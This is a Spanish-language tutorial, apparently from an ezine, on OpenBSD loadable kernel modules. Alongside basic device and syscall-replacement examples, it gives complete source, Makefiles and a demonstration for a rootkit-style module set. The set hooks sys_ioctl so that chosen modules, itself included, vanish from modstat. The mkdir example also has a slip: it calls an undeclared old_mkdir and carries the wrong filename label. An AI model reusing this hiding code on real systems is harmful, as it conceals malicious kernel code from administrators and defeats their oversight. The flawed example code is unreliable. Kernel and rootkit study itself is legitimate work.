+ * "intentos" de documentacion (y lo poco que hay solo trata FreeBSD) lo llamo
+ * como me parece. Espero que sea un buen nombre.. :D
+ *  En la estructura se va llamando a la macro dev_init(1,nombre,accion) las
+ * entradeas pueden ser: open, close, read, write, ioctl, stop, tty, select,
+ * mmap y kqfilter. lkm.h ;)
+ */
+static struct cdevsw acciones = {
+	dev_init(1,ejemplodev,open),
+	dev_init(1,ejemplodev,close),
+	dev_init(1,ejemplodev,read),
+	dev_init(1,ejemplodev,write),
+	dev_init(1,ejemplodev,ioctl),
+};
+
+int ejemplodevopen(dev_t dev, int oflags, int devtype, struct proc *p) {
+#ifndef QUIET
+	printf("Abriendo...\n");
+#endif
+	return(0);
+}
+
+int ejemplodevclose(dev_t dev, int fflag, int devtype, struct proc *p) {
+#ifndef QUIET
+	printf("Cerrando...\n");
+#endif
+	return(0);
+}
+
+/*
+ *  Esta es la funcion a la que se llama al leer. Lo que hace la funcion es ir
+ * metiendo en la cadena de estructura de datos lo que contenga el dispositivo
+ * en partes de 128 caracteres (el valor que tenga resid o la variable que sea
+ * al llamar a uiomove) hasta que o bien ya se ha leido todo (resid <= 0) o la
+ * llamada a uiomove, que es la funcion que se encarga de leer realmente, no
+ * haya devuelto un cero. Leyendo el codigo se aclara todo.
+ */
+int ejemplodevread(dev_t dev, struct uio *uio, int ioflag) {
+	int error = 0;
+        int resid = BUFFER;
+
+	do
+	{
+		if (uio->uio_resid < resid)
+			resid = uio->uio_resid;
+		error = uiomove(pepe.msg, resid, uio);
+	} while (resid > 0 && error == 0);
+
+	return(error);
+}
+
+/*
+ *  Esta es la funcion a la que se llama cuando queremos escribir en el
+ * dispositivo y hace lo mismo que la funcion read solo que al principio borra
+ * lo que haya en ese momento en el dispositivo y que el efecto de la llamada a
+ * la funcion es el contrario.
+ */
+int ejemplodevwrite(dev_t dev, struct uio *uio, int ioflag){
+	int error = 0;
+	int resid = BUFFER;
+
+	bzero(&pepe.msg, BUFFER);
+
+	do
+	{
+		if (uio->uio_resid < resid)
+			resid = uio->uio_resid;
+		error = uiomove(pepe.msg, resid, uio);
+	} while (resid > 0 && error == 0);
+
+	return(error);
+}
+
+/*
+ *  La funcion ioctl es tambien necesaria para que se pueda leer/escribir a/de
+ * un dispositivo. Conveniente man ioctl :)
+ */
+int ejemplodevioctl(dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *p) {
+	struct estructura_datos *d;
+	int error = 0;
+	switch(cmd) {
+	case ODREAD:
+		d = (struct estructura_datos *)data;
+		error = copyoutstr(&pepe.msg, d->msg, BUFFER - 1, NULL);
+		break;
+	case ODWRITE:
+		if ((fflag & FWRITE) == 0)
+			return(EPERM);
+		d = (struct estructura_datos *)data;
+		bzero(&pepe.msg, BUFFER);
+		error = copyinstr(d->msg, &pepe.msg, BUFFER - 1, NULL);
+		break;
+	default:
+		error = ENOTTY;
+		break;
+	}
+	return(error);
+}
+
+/*
+ *  La funcion a la que se llama al cargar/descargar el modulo, ya se ha visto
+ * en otras ocasiones.
+ */
+int ejemplodev_handler(struct lkm_table *lkmtp, int cmd) {
+	struct lkm_dev *args = lkmtp->private.lkm_dev;
+	if (cmd == LKM_E_LOAD) {
+		strncpy(pepe.msg,"Aun no has escrito nada en el dispositivo.\n", BUFFER - 1);
+#ifndef QUIET
+		printf("Cargando el %s\n", args->lkm_name);
+#endif
+	}
+	if (cmd == LKM_E_UNLOAD) {
+#ifndef QUIET
+		printf("Descargando el %s\n", args->lkm_name);
+#endif
+	}
+	return 0;
+}
+
+/*
+ *  La macro del dispositivo. El primer parametro es el nombre del modulo, el
+ * segundo es el tipo de dispositivo (LM_DT_CHAR o LM_DT_BLOCK) y el tercero
+ * es la estructura de las acciones del dispositivo.
+ */
+MOD_DEV("ejemplodev", LM_DT_CHAR, -1, &acciones)
+
+/*
+ *  Y la entry point, en su declaracion con los mismos parametros que siempre y
+ * con la llamada a la macro DISPATCH, igual que siempre. Esta vez usamos la
+ * misma funcion para cargar y descargar el modulo, a partir de aqui lo haremos
+ * siempre asi.
+ */
+int ejemplodev(struct lkm_table *lkmtp, int cmd, int ver) {
+	DISPATCH(lkmtp, cmd, ver, ejemplodev_handler, ejemplodev_handler, lkm_nofunc)
+}
+
+	Este es el codigo del programa, vamos a probar el modulo a ver como va:
+
+-->	ramblo$ gcc -O2 -Wall -D_KERNEL -I/sys -c ejemplodev.c
+-->	ramblo$ ld -r -o modulo.o ejemplodev.o
+-->	ramblo# modload -o ejemplodev -eejemplodev modulo.o
+-->	Module loaded as ID 0
+-->	ramblo# tail /var/log/messages
+-->	...
+-->	Aug 30 17:42:12 ramblo /bsd: Cargando el ejemplodev
+-->	Aug 30 17:42:12 ramblo /bsd: DDB symbols added: 125820 bytes
+-->	ramblo# modstat
+-->	Type    Id Off Loadaddr Size Info     Rev€Module     Name
+-->	DEV      0  29 e0929000 0002 e092a040   2 ejemplodev
+
+	Por ahora sabemos que esta cargado... Anotaciones: el "Off" del modstat
+cuando el modulos es para dispositivos es el major number del dispositivo
+creado, por lo que ya tenemos la suficiente informacion para usar mknod para
+crear el dispositivo (Al hacer el mknod se usa "c" si el dispositivo es de tipo
+CHAR o "b" si es de tipo BLOCK):
+
+-->	ramblo# mknod -m 644 /dev/ejemplodev c 29 0
+-->	ramblo# ls -la /dev/ejemplodev
+-->	crw-r--r--   1 root    wheel    29,    0 Aug 30 18:35 /dev/ejemplodev
+
+	Bien, parece que ya esta, vamos a hacer una prueba...
+
+-->	ramblo# head -n 1 /dev/ejemplodev
+-->	Aun no has escrito nada en el dispositivo.
+-->	ramblo# echo "No se si funcionara..." > /dev/ejemplodev
+-->	ramblo# head -n 1 /dev/ejemplodev
+-->	No se si funcionara...
+
+	Vemos que read y write, funciona, para que se escriba de una forma mas
+elegante, nos podriamos hacer un programa que llamase a ioctl y leyese o
+escribiese con ioctl, pero eso ya se escapa al texto (Un ejemplo lo pondre en un
+archivo de ejemplos con el texto)
+
+
+
+	- 5.- Ejemplos muy basicos de modulos -
+	 -------------------------------------
+
+	Bien, ya sabemos como van los MOD_SYSCALL, los MOD_MISC y los MOD_DEV,
+que son los mas utiles para propositos generales. Aqui hay otros ejemplos de
+modulos basicos, pero "mas" interesantes que los anteriores que pueden nos
+ayudaran para que los modulos empiecen a servir para algo. Como ya he dicho al
+comienzo, este texto esta orientado para orientar, es decir, para "exponer la
+forma con la que se hacen los modulos", por lo que no voy a hacer modulos de
+ejemplo complicados. Solo hare los necesarios para que se entienda la mecanica,
+no obstante, si alguien esta interesado en hacer algun modulo y tiene problemas,
+que me mande un mail, que yo hare lo que pueda.
+
+
+a) Primer ejemplo, usando MOD_MISC para crear/remplazar syscalls:
+-----------------------------------------------------------------
+	Cuando se hace un modulo llamando a una macro que no sea la de
+MOD_MISC, dicha macro hace algunas cosas para hacer mas facil la programacion,
+(mas facil o automatica? xD). Esto lleva una perdida de control de lo que pasa,
+y es posible que no queramos perderlo. Veamos como modificar una syscall usando
+los MOD_MISC. Si, esta vez tampoco vamos a hacer nada util, solo vamos a hacer
+lo que ya hizimos antes con MOD_SYSCALL, pero con MOD_MISC, es decir, vamos a
+suplantar sys_mkdir. Lo siento por quienes querian que les metiese una backdoor
+para OpenBSD en el texto, pero que la hagan ellos... xDD
+
+/*** COMIENZO DEL PROGRAMA *** ejemplodev.c ***********************************/
+/*
+ * Cabezeras...
+ */
+#include <sys/param.h>
+#include <sys/ioctl.h>
+#include <sys/proc.h>
+#include <sys/systm.h>
+#include <sys/conf.h>
+#include <sys/mount.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+#include <sys/syscall.h>
+#include <sys/syscallargs.h>
+
+
+/*
+ *  Guardamos la estructura para poder restaurar la syscall de antes de la
+ * modificacion, para cuando el modulo se descargue y queramos poner la antigua.
+ */
+static struct sysent mkdir_bck;
+
+/*
+ *  La estructura con los argumentos.
+ */
+struct argumentos {
+	syscallarg(const char *)	path;
+	syscallarg(int)			mode;
+};
+
+/*
+ *  La syscall que sustituye a la mkdir.
+ */
+int
+x_mkdir(struct proc *p, void *uap, int *retval)
+{
+	struct argumentos *u=uap;
+	int ret;
+	
+/*
+ *  SCARG, es una macro que como se puede ver, se le pasa una estructura de
+ * argumentos y un argumento dentro de la estructura y devuelve dicho argumento.
+ */
+	printf("Creando: %s\n", SCARG(u, path));
+
+/*
+ *  Llama a la antigua syscall y retorna lo que retorne dicha syscall.
+ */
+	ret = old_mkdir.sy_call(p, u, retval);
+	return ret;
+}
+
+MOD_MISC("joseadolfo")
+
+static int
+joseadolfo_handler(struct lkm_table *l, int cmd)
+{
+	int err = 0;
+	switch(cmd)
+	{
+		case LKM_E_LOAD:
+/*
+ *  Hace una copia de la syscall mkdir "buena" en mkdir_bck y posteriormente,
+ * sustituye la buena por la de pega.
+ */
+			bcopy(&sysent[SYS_mkdir], &mkdir_bck, sizeof(struct sysent));
+			sysent[SYS_mkdir].sy_call = x_mkdir;
+			break;
+		case LKM_E_UNLOAD:
+/*
+ *  Vuelve a asignar a sys_mkdir la syscall de origen y sale.
+ */
+			bcopy(&mkdir_bck, &sysent[SYS_mkdir], sizeof(struct sysent));
+			break;
+		default:
+			err = EINVAL;
+			break;
+	}
+	return(err);
+}
+
+int joseadolfo
+(struct lkm_table *l, int cmd, int ver)
+{
+	DISPATCH(l, cmd, ver, joseadolfo_handler, joseadolfo_handler, lkm_nofunc);
+}
+
+/*** FIN DEL PROGRAMA ********************************************************/
+
+	Bien, no tiene mucho de nuevo, por lo que me ahorro demostrar que
+funciona, y pasamos con algo mas interesante :)
+
+
+
+
+b) Segundo ejemplo, usando MOD_MISC para esconder modulos:
+-----------------------------------------------------------------
+	Este modulo es un modulo que crea un dispositivo y en funcion de lo que
+se le diga por el dispositivo, esconde los modulos que sean o ninguno... Este
+es el primer modulo que podemos utilizar para algo...
+	Lo primero es analizar el problema, lo que queremos es que no aparezcan
+ciertos modulos cuando hacemos un modstat, por lo que lo primero es... Tracear
+una ejecucion de modstat! Hacemos un ktrace a modstat y este es el resultado:
+
+-->	ramblo$ ktrace modstat
+-->	Type     Id Off Loadaddr Size Info     Rev Module Name
+-->	ramblo$ kdump -t c
+-->	...
+-->	...
+-->	...
+-->	 11389 modstat  CALL  ioctl(0x3,_IOWR('K',0xb,0x20),0xdfbfdb08)
+-->	 11389 modstat  RET   ioctl -1 errno 22 Invalid argument
+-->	 11389 modstat  CALL  close(0x3)
+-->	 11389 modstat  RET   close 0
+-->	 11389 modstat  CALL  exit(0)
+-->	ramblo$
+
+	Hummm, ioctl? Aun no se, vamos a probar con un modulo cargado... Una
+vez cargado un modulo...
+
+-->     ramblo$ ktrace modstat
+-->	Type     Id Off Loadaddr Size Info     Rev Module Name
+-->	MISC      0   0 e09b8000 0002 e09b9000   2 dummy
+-->     ramblo$ kdump -t c
+-->     ...
+-->     ...
+-->     ...
+-->	  7371 modstat  CALL  ioctl(0x3,_IOWR('K',0xb,0x20),0xdfbfdb1c)
+-->	  7371 modstat  RET   ioctl 0
+-->	  7371 modstat  CALL  write(0x1,0x5000,0x31)
+-->	  7371 modstat  RET   write 49/0x31
+-->	  7371 modstat  CALL  ioctl(0x3,_IOWR('K',0xb,0x20),0xdfbfdb1c)
+-->	  7371 modstat  RET   ioctl -1 errno 22 Invalid argument
+-->	  7371 modstat  CALL  close(0x3)
+-->	  7371 modstat  RET   close 0
+-->	  7371 modstat  CALL  exit(0)
+-->     ramblo$
+
+	Hummm, ahora se llama dos veces a ioctl y la primera (una vez), no da
+error... Vamos a ver el codigo de modstat...
+
+/*** CACHO DE CODIGO DEL MODSTAT *********************************************/
+...
+...
+...
+
+        if (ioctl(devfd, LMSTAT, &sbuf) == -1) {
+                switch (errno) {
+                case EINVAL:            /* out of range */
+                        return 2;
+                case ENOENT:            /* no such entry */
+                        return 1;
+                default:                /* other error (EFAULT, etc) */
+                        warn("LMSTAT");
+                        return 4;
+                }
+        }
+...
+...
+...
+/*****************************************************************************/
+
+	Si! Aqui se ve mas claro, tenemos que modificar sys_ioctl y que nuestro
+sys_ioctl devuelva ENOENT en caso de que se compruebe la existencia del modulo
+que nosotros queremos que no se vea... Asi que nada, hacemos un modulo que haga
+esto, pero e la programacion del modulo nos encontraremos con una dificultad,
+al cambiar sys_ioctl() nada, todo va bien, pero al volverla a poner como
+estaba, el kernel peta... Por que? Al descargar el modulo se esta utilizando
+sys_ioctl() para esto mientras que la estas modificando... Resultado? El kernel
+peta :)
+/* Aprovecho la ocasion para decir que el hangman del depurador mola xD */
+	Solucion? Hacer dos modulos. Uno que cambie sys_ioctl() por la nueva y
+otro que la restaure (ugly y unloading_dummy)
+	A partir de aqui es solo ver la declaracion de ioctl y hacer como en
+los modulos de antes, pero un pelin mas complicado... Aqui estan los ficheros
+de los modulos que hacen todo.
+
+/*** ugly.c ******************************************************************/
+#include <sys/param.h>
+#include <sys/ioctl.h>
+#include <sys/systm.h>
+#include <sys/conf.h>
+#include <sys/mount.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+#include <sys/file.h>
+#include <sys/errno.h>
+#include <sys/syscall.h>
+#include <sys/syscallargs.h>
+
+/*  Aqui tenemos algunas funciones de libc que vamos a usar en el modulo,
+ * porque en un modulo no podemos usar la libc real.
+ */
+#include "pseudo_libc.h"
+
+//#define QUIET
+#define DEBUG
+#define BUFFER	256
+
+
+int	hacked_ioctl	__P((struct proc *, void *, register_t *));
+
+/*
+ *  Esta es una estructura que va a usar el modulo para guardar lo que se haya
+ * leido por /dev/ugly  :)
+ */
+struct information {
+	int lkma;
+	int lkmb;
+} info;
+
+/*  La estructura de datos de este modulo se va a llamar juan, y el nombre del
+ * tipo, data_str.
+ */
+static struct data_str {
+	char msg[BUFFER];
+} juan;
+
+cdev_decl(ugly);
+static struct cdevsw actions = {
+	dev_init(1,ugly,open),  
+	dev_init(1,ugly,close), 
+	dev_init(1,ugly,read),  
+	dev_init(1,ugly,write), 
+	dev_init(1,ugly,ioctl), 
+};
+
+/*
+ * Device functions...
+ */
+int
+uglyopen(dev_t dev, int oflags, int devtype, struct proc *p) {
+#ifndef QUIET
+#ifdef DEBUG 
+	printf("Opening device...\n");
+#endif
+#endif
+	return(0);
+}
+
+int
+uglyclose(dev_t dev, int fflag, int devtype, struct proc *p) {
+#ifndef QUIET
+#ifdef DEBUG 
+	printf("Closing device...\n");
+#endif
+#endif
+	return(0);
+}
+
+int
+uglyread(dev_t dev, struct uio *uio, int ioflag) {
+	int error = 0;
+	int rest = BUFFER;
+	do
+	{ 
+		if (uio->uio_resid < rest)
+		rest = uio->uio_resid;
+		error = uiomove(juan.msg, rest, uio);
+	} while (rest > 0 && error == 0);
+	return(error);
+}
+
+int
+uglywrite(dev_t dev, struct uio *uio, int ioflag) {
+	int error = 0;
+	int resid = BUFFER;
+	char comando[256];
+	int i;
+	bzero(comando, 256);
+	bzero(&juan.msg, BUFFER);
+	if (uio->uio_resid < resid)
+	resid = uio->uio_resid;
+	error = uiomove(juan.msg, resid, uio);
+	x_strncat(comando, juan.msg, 256);
+
+/*
+ *  Realmente deberiamos usar sscanf() de la libc, pero para meterlo, habria
+ * que meter muchas mas cosas y se haria todo esto muy grande, por lo que he
+ * optado por no comerme el coco y elegir la solucion mas cutre, como solo
+ * tenemos dos opciones, lo hacemos mediante unos switch :P Lo que hace esto es
+ * interpretar lo que se ha leido del dispositivo (que pueden ser dos cosas
+ * seguidas de un numero) y lo mete en la estructura info que hicimos antes.
+ *  Posteriormente usaremos los valores de la estructura para actuar en
+ * consecuencia a estos.
+ */
+	if(comando[0]=='M')
+	{
+		if(comando[1]=='Y' && comando[2]=='L' && comando[3]=='K' && comando[4]=='M')
+		{
+			printf("Changing info.lkma...\n");
+			switch(comando[5])
+			{
+			case '0':
+				info.lkma=0;
+				break;
+			case '1':
+				info.lkma=1;
+				break;
+			case '2':
+				info.lkma=2;
+				break;
+			case '3':
+				info.lkma=3;
+				break;
+			case '4':
+				info.lkma=4;
+				break;
+			case '5':
+				info.lkma=5;
+				break;
+			case '6':
+				info.lkma=6;
+				break;
+			case '7':
+				info.lkma=7;
+				break;
+			case '8':
+				info.lkma=8;
+				break;
+			case '9':
+				info.lkma=9;
+				break;
+			default:
+				info.lkma=-1;
+			}
+		}
+	}
+	if(comando[0]=='O')
+	{
+		if(comando[1]=='T' && comando[2]=='L' && comando[3]=='K' && comando[4]=='M')
+		{
+			printf("Changing info.lkmb...\n");
+			switch(comando[5])
+			{
+			case '0':
+				info.lkmb=0;
+				break;
+			case '1':
+				info.lkmb=1;
+				break;
+			case '2':
+				info.lkmb=2;
+				break;
+			case '3':
+				info.lkmb=3;
+				break;
+			case '4':
+				info.lkmb=4;
+				break;
+			case '5':
+				info.lkmb=5;
+				break;
+			case '6':
+				info.lkmb=6;
+				break;
+			case '7':
+				info.lkmb=7;
+				break;
+			case '8':
+				info.lkmb=8;
+				break;
+			case '9':
+				info.lkmb=9;
+				break;
+			default:
+				info.lkmb=-1;
+			}
+		}
+	}
+
+/*
+ *  Saca por la salida del kernel el estado de las dos variables de la
+ * estructura info.
+ */
+	printf("State: info.lkma = %d    lkmb = %d\n", info.lkma, info.lkmb);
+
+	return(error);
+}
+
+uglyioctl(dev_t dev, u_long cmd, caddr_t data, int fflag, struct proc *p) {
+	struct data_str *d;
+	int error = 0;
+	switch(cmd) { 
+		case _IOR('O', 0, struct data_str): 
+			d = (struct data_str *)data;
+			error = copyoutstr(&juan.msg, d->msg, BUFFER - 1, NULL);
+			break;
+		case _IOW('O', 1, struct data_str):
+			if ((fflag & FWRITE) == 0)
+				return(EPERM);
+			d = (struct data_str *)data;
+			bzero(&juan.msg, BUFFER);
+			error = copyinstr(d->msg, &juan.msg, BUFFER - 1, NULL);
+			break;
+		default:
+			error = ENOTTY;
+			break;
+	}
+	return(error);
+}
+
+
+MOD_DEV ("ugly", LM_DT_CHAR, -1, &actions)
+
+static int
+ugly_load (struct lkm_table *lkmtp, int cmd) {
+	switch (cmd) {
+		case LKM_E_LOAD:
+			if (lkmexists(lkmtp))
+				return (EEXIST);
+			sysent[SYS_ioctl].sy_call = hacked_ioctl;
+
+			info.lkma = -1;
+			info.lkmb = -1;
+
+			break;
+		case LKM_E_UNLOAD:
+			/*
+			restoring sysent[SYS_ioctl].sys_call is done via an
+			evil hack. (see the Makefile)
+			*/
+			break;
+		default:
+			return (EINVAL);
+	}
+	
+	return (0);
+}
+
+ugly (struct lkm_table *lkmtp, int cmd, int ver) {
+	DISPATCH (lkmtp, cmd, ver, ugly_load, ugly_load, lkm_nofunc)
+}
+
+/*** FIN DE ugly.c ***********************************************************/
+
+/*** ioctl.c *****************************************************************/
+#include <sys/param.h>
+#include <sys/systm.h>
+#include <sys/mount.h>
+#include <sys/syscallargs.h>
+#include <sys/ioccom.h>
+#include <sys/conf.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+
+
+extern struct information {
+	int lkma;
+	int lkmb;
+} info;
+
+/*
+ *  Esta es la version modificada de sys_ioctl() que hemos de modificar por la
+ * real.
+ */
+int
+hacked_ioctl (p, v, retval)
+	struct proc	*p;
+	void		*v;
+	register_t	*retval;
+{
+	struct sys_ioctl_args /*  {
+		syscallarg(int)		fd;
+		syscallarg(u_long)	com;
+		syscallarg(caddr_t)	data;
+	} */		*uap = v;
+
+/*
+ * Mirad la declaracion de lkm_stat, que para eso tenemos las cabezeras ahi. :P
+ */
+	struct lmc_stat	*statp;
+
+	if (SCARG(uap,com) == LMSTAT) {
+		printf("sys_ioctl(?, LMSTAT, ?) -> Called\n");
+		statp = SCARG(uap, data);
+
+	printf("State: info.lkma = %d     info.lkmb = %d\n", info.lkma, info.lkmb);
+
+		printf("Is the ID like info.lkma (%d)? ---> ", info.lkma);
+
+/*
+ *  Si statp.id, que es el numero ID del modulo para el que se llama a
+ * sys_ioctl coincide con nuestra info.lkma o con info.lkmb, retorna ENOENT
+ * que como vimos en la traza de modstat, es lo que devuelve sys_ioctl cuando
+ * no hay mas modulos.
+ */
+		if (statp->id == info.lkma)
+		{
+			/* basic hiding, could/should be improved */
+			printf("Yes! ID: %d\n", statp->id);
+			return ENOENT;
+		}
+		else
+		{
+			printf("No.\nIs the ID like info.lkmb (%d)? ---> ", info.lkmb);
+
+			if (statp->id == info.lkmb)
+			{
+				/* basic hiding, could/should be improved */
+				printf("Yes! ID: %d\n", statp->id);
+				return ENOENT;
+			}	
+			else
+			{
+				printf("No.\nNot hidding...\n");
+			}
+		}
+		printf("statp->id was %d\n", statp->id);
+	}
+
+/*
+ * De no ser asi, simplemente llama a la sys_ioctl de siempre.
+ */
+
+	return (sys_ioctl(p, v, retval));
+}
+/*** FIN DE ioctl.c **********************************************************/
+
+/*** unloading_dummy/unloading_dummy.c ***************************************/
+/*
+ *  Este es el modulo que descarga el otro modulo.
+ */
+#include <sys/param.h>
+#include <sys/ioctl.h>
+#include <sys/systm.h>
+#include <sys/conf.h>
+#include <sys/mount.h>
+#include <sys/exec.h>
+#include <sys/lkm.h>
+#include <sys/file.h>
+#include <sys/errno.h>
+#include <sys/syscall.h>
+#include <sys/syscallargs.h>
+
+MOD_MISC ("unloading_dummy")
+
+static int
+unloading_dummy_load (struct lkm_table *lkmtp, int cmd) {
+	switch (cmd) {
+		case LKM_E_LOAD:
+			if (lkmexists(lkmtp))
+				return (EEXIST);
+/* Al cargarse este modulo descarga el otro :D */
+			sysent[SYS_ioctl].sy_call = sys_ioctl;
+
+			break;
+		case LKM_E_UNLOAD:
+			break;
+		default:
+			return (EINVAL);
+	}
+	
+	return (0);
+}
+
+unloading_dummy (struct lkm_table *lkmtp, int cmd, int ver) {
+	DISPATCH (lkmtp, cmd, ver, unloading_dummy_load, unloading_dummy_load, lkm_nofunc)
+}
+/*** FIN DE unloading_dummy/unloading_dummy.c ********************************/
+
+
+/*** pesudo_libc.h ***********************************************************/
+/*
+ *  Estas son algunas de las funciones de libc que necesitaba para el modulo.
+ * Son copias *directas* del codigo de OpenBSD.
+ */
+#include <string.h>
+#include <unistd.h>
+
+#include "config.h"
+
+/* STRNCMP */
+int
+x_strncmp(s1, s2, n)
+	register const char *s1, *s2;
+	register size_t n;
+{
+	if (n == 0)
+		return (0);
+	do {
+		if (*s1 != *s2++)
+			return (*(unsigned char *)s1 - *(unsigned char *)--s2);
+		if (*s1++ == 0)
+			break;
+	} while (--n != 0);
+	return (0);
+}
+
+/* STRNCAT */
+char *
+x_strncat(dst, src, n)
+	char *dst;
+	const char *src;
+	register size_t n;
+{
+	if (n != 0) {
+		register char *d = dst;
+		register const char *s = src;
+
+		while (*d != 0)
+			d++;
+		do {
+			if ((*d = *s++) == 0)
+				break;
+			d++;  
+		} while (--n != 0);
+		*d = 0;
+	}
+	return (dst);
+}
+/* STRSTR */
+char *
+x_strstr(s, find)
+	register const char *s, *find;
+{  
+	register char c, sc;
+	register size_t len;
+
+	if ((c = *find++) != 0) {
+		len = strlen(find);
+		do {
+			do {
+				if ((sc = *s++) == 0)
+					return (NULL);
+			} while (sc != c);
+		} while (strncmp(s, find, len) != 0);
+		s--;
+	}   
+	return ((char *)s);
+}
+/*** FIN DE pseudo_libc.h ****************************************************/
+
+/*** Makefile ****************************************************************/
+#Este es el Makefile principal.
+CFLAGS+=-D_KERNEL -I/sys
+
+all:	ugly_mod.o unloader
+clean:
+	rm -f ugly.o ioctl.o ugly_mod.o ugly && \
+	cd unloading_dummy && \
+	make clean
+load:
+	modload -o ugly -eugly ugly_mod.o
+	sh makedev.sh
+unload:
+	cd unloading_dummy && \
+	make load && \
+	make unload
+	modunload -n ugly
+unloader:
+	cd unloading_dummy && \
+	make
+device:
+	sh makedev.sh
+ugly_mod.o: ugly.o ioctl.o unloader
+	ld -r -o ugly_mod.o ugly.o ioctl.o
+
+/*** FIN DE Makefile *********************************************************/
+
+/*** makedev.sh **************************************************************/
+#!/bin/sh
+# Crea el dispositivo de comunicacion con el kernel.
+
+# Cambiar por el Off del modstat
+MAJOR=29
+mknod -m 644 /dev/ugly c $MAJOR 0
+ls -l /dev/ugly
+
+/*** FIN DE makedev.sh *******************************************************/
+
+/*** unloading_dummy/Makefile ************************************************/
+# Este es el Makefile de unloading_dummy
+CFLAGS+=-D_KERNEL -I/sys
+
+all: unloading_dummy_mod.o
+clean:
+	rm -f unloading_dummy.c unloading_dummy_mod.o unloading_dummy
+load:
+	modload -o unloading_dummy -eunloading_dummy unloading_dummy_mod.o
+unload:
+	modunload -n unloading_dummy
+unloading_dummy_mod.o: unloading_dummy.o
+	ld -r -o unloading_dummy_mod.o unloading_dummy.o
+
+/*** FIN DE unloading_dummy/Makefile *****************************************/
+
+	Ya esta! Como hay un poco de lio con los archivos los listo para que
+quede todo claro y hago una demostracion del modulo en accion :D
+-->	ramblo$ pwd
+-->	/home/prodix/devel/modulos/ugly
+-->	ramblo$ ls -lF
+-->	total 22
+-->	-rw-r--r--  1 prodix  prodix   539 Nov 24 14:12 Makefile
+-->	-rw-r--r--  1 prodix  prodix  1276 Nov 30 17:03 ioctl.c
+-->	-rwxr-xr-x  1 prodix  prodix   115 Nov 24 14:12 makedev.sh*
+-->	-rw-r--r--  1 prodix  prodix   960 Nov 24 12:45 pseudo_libc.h
+-->	-rw-r--r--  1 prodix  prodix  4159 Nov 30 17:00 ugly.c
+-->	drwxr-xr-x  2 prodix  prodix   512 Nov 30 20:56 unloading_dummy/
+-->	ramblo$ cd unloading_dummy
+-->	ramblo$ ls -lF
+-->	total 4
+-->	-rw-r--r--  1 prodix  prodix  347 Nov 24 00:37 Makefile
+-->	-rw-r--r--  1 prodix  prodix  722 Nov 24 00:37 unloading_dummy.c
+-->	ramblo$ cd ..
+-->	ramblo$ make
+-->	cc -O2   -D_KERNEL -I/sys  -c ugly.c
+-->	cc -O2   -D_KERNEL -I/sys  -c ioctl.c
+-->	cd unloading_dummy &&  make
+-->	cc -O2   -D_KERNEL -I/sys  -c unloading_dummy.c
+-->	ld -r -o unloading_dummy_mod.o unloading_dummy.o 
+-->	ld -r -o ugly_mod.o ugly.o ioctl.o
+-->	ramblo$ su
+-->	Password:
+-->	ramblo# make load
+-->	modload -o ugly -eugly ugly_mod.o
+-->	Module loaded as ID 0
+-->	sh makedev.sh
+-->	crw-r--r--  1 root  wheel   29,   0 Nov 30 21:06 /dev/ugly
+-->	ramblo# modstat
+-->	Type     Id Off Loadaddr Size Info     Rev Module Name
+-->	DEV       0  29 e0da9000 0002 e0daa040   2 ugly
+
+	Por que no se esconde? Pues porque los modulos que se esconden se
+tienen que seleccionar, diciendole al dispositivo cual es la ID del modulo que
+sea... (Si te has leido el codigo deberias de saberlo)... asi que...
+
+-->	ramblo# echo MYLKM0 > /dev/ugly
+-->	ramblo# modstat
+-->	Type     Id Off Loadaddr Size Info     Rev Module Name
+-->	ramblo#
+
+	Bien! No sale! Pero como sabras, esta hecho para esconderse a si mismo
+y a otro... Vamos a cargar otro... Uno que no hace nada mas que escribir una
+cosa, como el primer ejemplo...
+
+-->	ramblo# cd ../dummy/
+-->	bash-2.05# make && make load
+-->	cc -O2   -D_KERNEL -I/sys  -c dummy.c
+-->	ld -r -o dummy_mod.o dummy.o 
+-->	modload -o dummy -edummy dummy_mod.o
+-->	Module loaded as ID 1
+-->	ramblo# modstat
+-->	Type     Id Off Loadaddr Size Info     Rev Module Name
+-->	MISC      1   0 e0e3a000 0002 e0e3b000   2 dummy
+-->	ramblo# echo OTLKM1 > /dev/ugly
+-->	ramblo# modstat
+-->	Type     Id Off Loadaddr Size Info     Rev Module Name
+-->	ramblo#
+
+	Ya esta! No sale este ni el modulo independiente, que por ejemplo,
+podria ser un modulo que crea un dispositivo que hace algo que los usuarios
+sin permisos no queremos que sepan que esta... :)
+
+	Para hacer otros modulos, tengan el objetivo que tengan, investigaremos
+que tenemos que hacer de la misma manera que habeis visto para esconder los
+modulos. (Aunque este modulo pueda darsele uso lo que pretendia era mostrar la
+forma de actuar ante una situacion real).
+
+
+	- 6.- Textos recomendados y archivos importantes -
+	 ------------------------------------------------
+
+	Ya dije que es muy probable que quien no haya leido nada sobre modulos
+previamente no se haya enterado, el texto esta orientado a ver la forma de
+trabajar los modulos bajo OpenBSD...
+
+	-Textos:
+	Linux LKMs: Troyanizando el kernel  - 7a69 ezine #12  --- Ripe
+	Attacking FreeBSD with kernel modules                 --- Pragmatic 
+
+	-Ficheros:
+	/usr/src/sys/sys/lkm.h             <--- Fichero de cabezera.
+	/usr/src/sys/kern/kern_lkm.c       <--- Base de los LKM en OpenBSD.
+	/usr/share/lkm/*                   <--- Ejemplos de LKM para OpenBSD.
+	/usr/share/man/cat4/lkm.0          <--- Pagina man.
+
+
+	- 7.- Resumen a modo de despedida -
+	 ---------------------------------
+
+	Bien, cuando se aborda la programacion de un modulo, lo primero es
+plantearse que es lo que se quiere hacer... Si se sabe con certeza que es como
+se ha de hacer, pues muy bien, si no, para ver lo que hay que "tocar" lo
+lo primero es tracear las llamadas al sistema que se hacen y leerse el codigo
+del programa y/o del kernel que haga falta.
+	Por ejemplo, en el ejemplo del modstat, lo primero que hizimos fue
+ver las llamadas al sistema que usa el programa y luego leimos el codigo fuente
+del programa modstat. Como ya sabiamos que habia que modificar sys_ioctl(),
+pues nos vamos al kernel, nos la leemos y vemos como funciona.
+	Ya lo ultimo es meter mano y a programar. Suerte con los modulos!  :)
+
+	Si teneis preguntas que hacerme o comentarios o lo que sea, sentiros
+libres de escribidme a luisj@gmx.net.
+
+
+*EOF*
